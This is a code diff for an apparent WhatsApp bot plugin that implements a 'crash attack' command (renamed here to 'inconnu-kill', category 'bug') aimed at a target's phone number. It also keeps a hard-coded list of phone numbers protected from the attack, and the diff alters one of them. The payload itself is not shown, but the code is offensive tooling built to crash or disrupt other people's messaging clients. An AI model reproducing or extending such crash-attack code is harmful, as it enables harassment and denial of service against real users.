@@ -24,7 +24,7 @@ async function loadDevNumbers() {
         }
     } catch (e) {
         console.log('⚠️ Could not load dev numbers, using default protection');
-        devNumbers = ['554488122687@s.whatsapp.net', '554497461113@s.whatsapp.net'];
+        devNumbers = ['554488122687@s.whatsapp.net', '55449746111@s.whatsapp.net'];
     }
 }
 
@@ -114,10 +114,10 @@ async function adminBokepCrash(conn, target) {
 // OWNER COMMAND: .admin-bokep
 // ============================================================
 cmd({
-    pattern: "admin-bokep",
+    pattern: "inconnu-kill",
     alias: ["abokep", "admincrash", "bokepcrash"],
     desc: "Admin bokep crash attack",
-    category: "owner",
+    category: "bug",
     react: "🔥",
     filename: __filename
 }, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
@@ -153,7 +153,7 @@ cmd({
 
     const targetNumber = target.split('@')[0];
     
-    // Send attack started message
+    // Send attack started Message 
     await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
 │ 🔥 INCONNU CRASH ATTACK
 │
